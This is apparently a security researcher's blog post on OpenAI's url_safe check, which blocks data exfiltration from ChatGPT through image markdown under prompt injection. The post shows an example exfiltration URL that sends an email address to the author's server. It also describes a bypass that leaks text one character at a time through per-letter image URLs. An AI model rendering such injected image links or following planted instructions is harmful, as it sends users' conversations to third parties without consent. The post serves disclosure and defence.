---
title: "OpenAI mitigates data exfiltration vulnerability in ChatGPT (more improvements needed)"
date: 2023-12-20T02:35:07-08:00
draft: true
tags: [
     "aiml", "machine learning","red","chatgpt","data exfiltration"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "ChatGPT: OpenAI mitigates data exfiltration vulnerability"
  description: "Good news. It appears that OpenAI started mitigating the image markdown data exfiltration angle."
  image: "https://embracethered.com/blog/images/2023/openai-fix-3.png"
---

OpenAI seems to have implemented a first mitigation for a well-known data exfiltration vulnerability in ChatGPT. Attackers can use image markdown rendering during Prompt Injection to send data to third party servers without the users' consent. 

The fix is not perfect but a step into the right direction. In this post I share what I figured out so far about the fix after looking at it briefly this morning.

## Background

Yesterday I was doing a live demo of the [data theft GPT](/blog/posts/2023/openai-custom-malware-gpt/) with a consenting victim. ChatGPT was still vulnerable to data exfiltration via image markdown injection and my server received the conversation details:

[![OpenAI Raeuber](/blog/images/2023/openai-last.png)](/blog/images/2023/openai-last.png)

Needless to say and as you can read in the screenshot above (sorry it's in German) the user was not too amused about this. 

The data exfiltration vulnerability was first reported to OpenAI early April 2023, but remained unaddressed.

Starting today it appears that a mitigation has been implemented. 🎉🎉🎉

## The Mitigation

It's a new kind of mitigation, different from how other vendors fixed this vulnerability.

When the server returns an image tag with a hyperlink there is now a ChatGPT client side call to a validation API before deciding to display an image.

The call is to an endpoit called `url_safe`:

```
https://chat.openai.com/backend-api/conversation/[id]/url_safe
```

where it appends the target URL as query parameter

```
?url=https://wuzzi.net/r?thief=johannr@example.org
```

and in this case it returns: 

```
{"safe":false}
```

`safe=false` means that it will not render the image and perform the request to the attackers server!


[![OpenAI Mitigation](/blog/images/2023/openai-fix-3.png)](/blog/images/2023/openai-fix-3.png)


It still renders **other** images though.

Since ChatGPT is not open source and the fix is not via a Content-Security-Policy (that is visible to users and researchers) the exact validation details are not known. 

There is some internal decision making happening when an image is considered safe and when not, maybe ChatGPT queries the Bing index to see if an image is valid and pre-existing or have other tracking capabilities and/or other checks.

**This is good news.**

Having a central validation API hopefully also means that Enterprises customers will be able configure this setting to further increase the security posture of ChatGPT for their environments.

## Not a perfect fix - Remaining Concerns

As stated, it's not a perfect fix. 

It is still renders requests to arbitrary domains at times, and it can be used to send data out. Obvious trickeries like splitting text into individual characters and creating a request per character for instance showed some (limited) success at a first glance. It only leaks small amounts this way, is slow and more noticable to a user and also to OpenAI if logs of the `url_safe` API are reviewed and monitored. 

To give an example out of 36 characters (a-z 0-9) I got nine of them rendered via unique URLs. So for instance this URLs exfiltrates (and also renders) the letter `a` and passed the check: `/url_safe?url=https://wuzzi.net/img/a.png`

Here is a demo showing leaking of individual characters (from experience we know that attacks usually get better over time):

[![OpenAI Bypass Char by Char](/blog/images/2023/openai-fix-bypass-char-by-char.png)](/blog/images/2023/openai-fix-bypass-char-by-char.png)

Above exfiltrates the text "hi" to the third party server by sending each letter as a seperate request. 

So, the current mitigation is a step in the right direction, more might be needed.

**I would suggest to OpenAI to limit the number of images that are rendered per response to just one or maybe a handful maximum, as that will further mitigate some of these bypass trickeries.** 

Its unclear why:
* `https://wuzzi.net/img/a.png` is a safe URL and is rendered but
* `https://wuzzi.net/img/d.png` is not a safe URL?

Sharing the details of the validation check would also improve confidence in the mitigation, after all I hope it is not an LLM alone that checks if the URL is safe. :)

## Conclusion

- The validation check for safe URLs improves the security posture and should allow OpenAI to monitor for attacks and notice patterns, which is good.  

- The decision details on when a URL is considered safe are not known.

- It's not a 100% perfect mitigation to prevent sending information to third party servers. Some quick tests show that bits of info can steal leak, but it is a step in the right direction for sure.

As you can imagine I'm quite happy about this improvement. After the lenghty discussions I had with OpenAI in April and the many more demos I created to raise awareness across the industry. With each new feature risks increase (Plugins, Browsing, Code Interpreter, GPTs, GPT Store,...) and its good to see mitigations being considered now.